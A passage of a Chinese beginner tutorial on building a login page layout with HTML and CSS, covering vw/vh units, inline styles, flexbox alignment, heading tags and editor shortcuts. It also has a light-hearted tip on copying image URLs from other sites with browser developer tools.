class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这段代码中，我们还用了四个div标签划分了四个主要区域，并分别取了类名，比如给标题栏栏添加了类名<code>class="title_seciton"</code>，因为一会我们要去给他们分别写样式，比如头顶区域占多宽，背景颜色是什么，我们当然需要给它取个名，以便我们可以通过名字定位到这个元素。就像我可以给你们每个人安排一个学号，我可以通过学号叫你起来回答问题。<br>之后我们用<code>.title_section</code>选中标题区域，<code>.</code>就是类名选择器，给它添加样式，比如说<code>width: 100vw;</code>表示宽占100vw，vw是什么单位呢？一个屏幕的宽总共分成100个vw，100vw就表示整个屏幕宽。接下来你应该可以推断出一个屏幕的高分成100个vh，10vh就表示占整个屏幕的10%。<br><strong>提问：</strong>这里我为什么不用px像素呢？用像素有什么不好？<br>另外我为了让大家更清楚看到我们划分好的区域，我用<code>background-color: white;</code>指定了背景颜色，当然我们项目正式上线之后，这个背景颜色是不需要的。</p><h2 id="4-行内样式"><a href="#4-行内样式" class="headerlink" title="4.行内样式"></a>4.行内样式</h2><p>运行之后这么一看好像没毛病对吧，每个元素都很明确分配了高度，但是你不能只考虑正常的情况，我们来做一个实验，如果屏幕高度不够的情况的话会发生什么事情。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 网页主体 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">height</span><span class="token punctuation">:</span> 50vh<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 标题区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title_section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 图片区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image_section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 用户输入区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_secition<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 按钮区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button_section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.title_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 10vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> antiquewhite<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.image_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 25vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkgray<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.input_secition</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 30vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkseagreen<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.button_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 20vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> pink<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上面这段代码中，我们给body标签通过行内样式设置了height为50vh，行内样式就是直接给这个标签元素写样式，语法就是你想给这个标签写样式，你就在这个标签的开始标签里加上<code>style=""</code>，在这里面你就可以写上你想添加的样式。</p><p><strong>提问:</strong> 通过行内样式去给元素添加样式显然非常方便，但是这样做的弊端是什么？</p><p>我们在保存看一下效果，你主要观察一下，有没有发现，因为总的高度body只有整个屏幕高度的一半，最后一个区域直接显示不出来了。</p><h2 id="5-弹性盒子布局"><a href="#5-弹性盒子布局" class="headerlink" title="5.弹性盒子布局"></a>5.弹性盒子布局</h2><p>我们从刚才的以上的案例发现，如果总的高度不够，传统布局下，有的区域是显示不出来的，这样的布局存在明显的弊端，现在都基本不用了。</p><p>关于布局的样式有很多，相对定位，绝对定位，固定定位，粘性定位，浮动等等，如果要一个个详细讲，再一个个举例，差不多半学期就过去了。其实从我的开发经验来说，就是弹性盒子最实用，也最简单，所谓一招鲜，吃遍天，会了弹性盒子，几乎90%以上的问题可以解决，总结一下就是：遇事不决，弹性盒子。<br>那弹性盒子究竟有什么好处呢，弹性盒子顾名思义是有弹性的，它可以根据自己的内容动态调整，不用我们去操心太多，非常省心好用，具体的原理也不讲了，讲多了你们容易困，我们在实际项目中去体会吧。</p><p>接下来我们再看一下弹性盒子。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 网页主体 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">height</span><span class="token punctuation">:</span> 50vh<span class="token punctuation">;</span><span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span><span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 标题区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title_section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 图片区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image_section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 用户输入区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_secition<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 按钮区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button_section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.title_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 10vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> antiquewhite<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.image_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 25vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkgray<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.input_secition</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 30vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkseagreen<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.button_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 20vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> pink<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>你发现区别了吗？我们在刚才的基础上，给body标签多加了两行代码，<code>display: flex;</code>是指摆放的方式为弹性盒子布局排列，排列的方向默认是横向的，在我们这个项目中，四个区域应该是从上到下排列的，所以还需要加上<code>flex-direction: column;</code>意思是排列的方向是纵向的。</p><p>发现区别了吗？是不是四个区域都显示出来了，这就是弹性盒子所谓的“弹性”，如果空间够的话大家当然开开心心的，如果空间不够的时候，你让我一点，我让你一点，咱们稍微挤一挤，是不是日子也能凑合过下去。</p><h2 id="6-弹性盒子对其方式"><a href="#6-弹性盒子对其方式" class="headerlink" title="6.弹性盒子对其方式"></a>6.弹性盒子对其方式</h2><p>接下来我们开始从上到下，开始写代码吧，首先是标题栏，我们先讲一讲标题标签吧<br>标题栏中有两个元素，一个是左边的登录文字，另外一个是右边的关闭按钮，这两个元素应该是处于同一行的。</p><ul><li>提问：标题栏的两个元素应该是横着排，还是竖着排?<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 标题区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title_section<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span><span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>用户登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>X<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>但是我们发现这两个元素靠在一起的，我们其实希望他们能够纵向居中，横向分布到两边对齐（如果不清楚的话自己看看设计图长什么样，照着设计图做）。</li></ul><p>主轴方向的对齐和副轴方向的对齐分别由<code>justify-content</code>和<code>align-items</code>控制。</p><table><thead><tr><th>justify-content   align-items的属性</th><th>作用</th></tr></thead><tbody><tr><td>flex-start</td><td>弹性项目向行头紧挨着填充</td></tr><tr><td>flex-end</td><td>弹性项目向行尾紧挨着填充</td></tr><tr><td>center</td><td>弹性项目居中紧挨着填充</td></tr><tr><td>space-between</td><td>弹性项目平均分布在该行上</td></tr><tr><td>space-around</td><td>弹性项目平均分布在该行上，两边留有一半的间隔空间</td></tr></tbody></table><p>这里多应该选哪一个呢？我也不知道哦，自己都去试一下，看看哪个更合适一点，之所谓书上得来终觉浅，绝知此事要躬行。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 标题区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title_section<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span><span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token property">justify-content</span><span class="token punctuation">:</span> space-around<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>用户登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>X<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>flex-direction: row;</code>的意思是弹性盒子的排列方向是横向，其实网页元素基本就是竖着排和横着排两种。</p><h2 id="7-标题标签"><a href="#7-标题标签" class="headerlink" title="7.标题标签"></a>7.标题标签</h2><p>另外你可能还注意到一件事情，我在这里用到了<code>h3</code>标签，h开头的标题标签，这样吧，你来试试下面这段代码，自己找找规律，然后来教我，我的教学观念就是，知识是你们自己发现的，不是靠教师灌输的，自己要去多练，要敢于尝试、大胆探索。我顶多就是起个引导的作用，遇到问题答疑一下，其实有我没我都差不多。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">&gt;</span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">&gt;</span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-快捷键"><a href="#8-快捷键" class="headerlink" title="8.快捷键"></a>8.快捷键</h2><p>敲完代码双击一下.html文件看一下效果吧，怎么样？聪明的你发现区别了吗？是不是几级标题就是h几，是不是很简单呢？有同学可能会问，有没有h100呢？这个我也不知道，你如果有好奇心的就自己去试一下，有好奇心的同学走得更远。<br>提问:我如果觉得字太大了，我想改小一点，应该怎么办呢？<br>html就是各种标签的应用，我们几个项目做下来，常用的都掌握得差不多了，至于那种你做二十个项目还用不到一次得冷门标签，既然都用不到，那你学它干嘛，不学也罢。<br>另外我知道，学到这里班级里已经形成CV党势力，就全程复制粘贴，好像打一点代码会被手指累断。因为他觉得这么简单的代码，看都看会了，何必去打？但是哪有不打代码的程序员，打这些代码也是有技巧的，我们要多去使用快捷键，快速打完代码，不然会让别人觉得我们不专业。我这里先教一点简单的技巧。</p><ul><li><p><strong>ctrl+z</strong>：撤销</p></li><li><p><strong>ctrl+y</strong>：反撤销（就是后悔撤销了）</p></li><li><p><strong>ctrl+x</strong>：剪切一行</p></li><li><p><strong>ctrl+shift+k</strong>:  删除多行</p></li><li><h5 id="ctrl-x2F-：-注释代码"><a href="#ctrl-x2F-：-注释代码" class="headerlink" title="ctrl+/： 注释代码"></a>ctrl+/： 注释代码</h5><p>好了，讲了这么多，我把代码全部贴出来，大家看看吧，记得不要复制哦。</p></li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 网页主体 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span><span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 标题区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title_section<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span><span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token property">justify-content</span><span class="token punctuation">:</span> space-around<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>用户登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>X<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 图片区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image_section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 用户输入区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_secition<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 按钮区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button_section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.title_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 10vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> antiquewhite<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.image_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 25vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkgray<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.input_secition</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 30vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkseagreen<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.button_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 20vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> pink<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>怎么样，累吗？我们终于把标题栏写好了，有没有感觉松了一口气呢，没想到看上去这么简单的东西其中却包含了很多的知识点，其中还有一些深入的内容我先不给大家介绍了，我们先学会简单的应用即可，随着我们项目的积累，我会越来越深入地带大家了解掌握。</p><h2 id="9-偷图片小技巧"><a href="#9-偷图片小技巧" class="headerlink" title="9.偷图片小技巧"></a>9.偷图片小技巧</h2><p>下面是一张呆萌图片，等等，你如果问我是不是老二次元，我只能回答：NONONO！，我只是浏览别人的网站总习惯随手拿点什么东西，图片、CSS、JS、甚至接口，偷？噢你怎么会想到这样的词汇，来侮辱神圣的爬虫，爬虫不能算偷……爬虫！……程序员的事，能算偷么！？所谓自己动手，丰衣足食，别想着这些素材我都给你们，现在我只是教你们通过开发工具的小技巧获取别人的图片，如果有机会的话，你会学到我精心设计的爬虫课程，那时候我们可以把别人的网站“扒”得更干净，效率更强。<br><img src="http://10.163.72.39:7777/image/qianduan/1.png" width="100%"><br>按下<code>F12</code>打开浏览器开发者工具，然后根据左上角的定位工具，定位到图片元素所在的标签，然后复制其中的src属性中的地址，<a href="http://10.163.72.39:7777/image/shuazan/sz6.jpg">http://10.163.72.39:7777/image/shuazan/sz6.jpg</a> 怎么样，你找对了吗？</p><h2 id="10-图片标签"><a href="#10-图片标签" class="headerlink" title="10.图片标签"></a>10.图片标签</h2><p>等等，我们好像已经学会了图片标签，还记得刚才我们去拿别人图片看到的吗？是不是用的img标签，然后其中有个src属性，你应该也能猜到，这个src属性就是指的是图片的地址。<br>但是别激动，我知道有同学已经写好代码了，但是别忘了，我们第一步是先设计好布局，这个图片的区域实际上是包括两部分的，上面是一张图片，下面是一句欢迎语，聪明的你可以告诉我，这两部分应该是横向排列还是纵向排列，好了，我把代码贴上来，你看看你写对了吗？</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 图片区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image_section<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span><span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span><span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../static/logo.png<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">&gt;</span></span>Hi、请登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" 